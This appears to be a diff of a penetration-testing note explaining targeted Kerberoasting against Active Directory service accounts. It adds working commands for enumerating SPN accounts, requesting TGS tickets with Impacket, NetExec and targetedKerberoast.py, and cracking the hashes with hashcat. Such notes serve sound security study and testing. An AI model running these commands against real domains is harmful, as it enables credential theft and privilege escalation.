@@ -21,19 +21,32 @@ It is a method used to extract and crack service account passwords that utilize 
     
     - Once the attacker cracks the password, they can use it to impersonate the service account, which may have elevated privileges in the domain, granting them further access to sensitive systems or data.
 
-#### Steps in Targeted Kerberoasting:
+#### Targeted Kerberoasting Process:
 
 1. **Enumerate Service Accounts**:
-    
-- Use tools like **BloodHound**, **Kerberos Enumeration**, or **Nmap** to identify service accounts that have SPNs associated with them.
-    
+
+- Find service accounts with SPNs using LDAP tools or BloodHound (SharpHound collector).
+
+![](../../Images/bloodhound_kerberosteable_users.png)
+
+- Quick CLI alternative (Impacket) to enumerate SPN-enabled accounts:
 ```bash
 impacket-GetUserSPNs -request -dc-ip target_ip domain_name/user
 ```
 
 2. **Request TGS for Identified Service Accounts**:
 
-- After identifying the target SPNs, you can use the script to request TGS tickets for those service accounts.
+- After identifying the target SPNs, you can request TGS tickets for those service accounts.
+
+**Using Netexec (Doesn't need to enumerate SPNs previously)**
+```bash
+nxc ldap <ip> -u 'user' -p 'password' --kerberoasting hash.txt
+```
+
+**Using targetedKerberoast**
+```bash
+python targetedKerberoast.py -u <username> -p <password> -d <domain> -t <target_spn>
+```
 
 | Option    | Description |
 |-----------|-------------|
@@ -43,18 +56,13 @@ impacket-GetUserSPNs -request -dc-ip target_ip domain_name/user
 | **`-t`**  | Target SPN (the service account you want to target). |
 
 
-```bash
-python targetedKerberoast.py -u <username> -p <password> -d <domain> -t <target_spn>
-```
-
-
-3. **Extract and Save the TGS Ticket**:
-    - The TGS ticket is saved in a file, which contains the encrypted hash of the service account password.
-    - This is typically done using **Mimikatz**, **Impacket**, or **Rubeus**.
-
-4. **Crack the Hash Offline**:
+3. **Crack the Hash Offline**:
     
     - The encrypted hash is cracked using password-cracking tools like **Hashcat** or **John the Ripper**.
 ```bash
 hashcat -m 13100 service-ticket.hash /usr/share/wordlists/rockyou.txt
 ```
+
+![](../../kerberoasting_results_example.png)
+
+
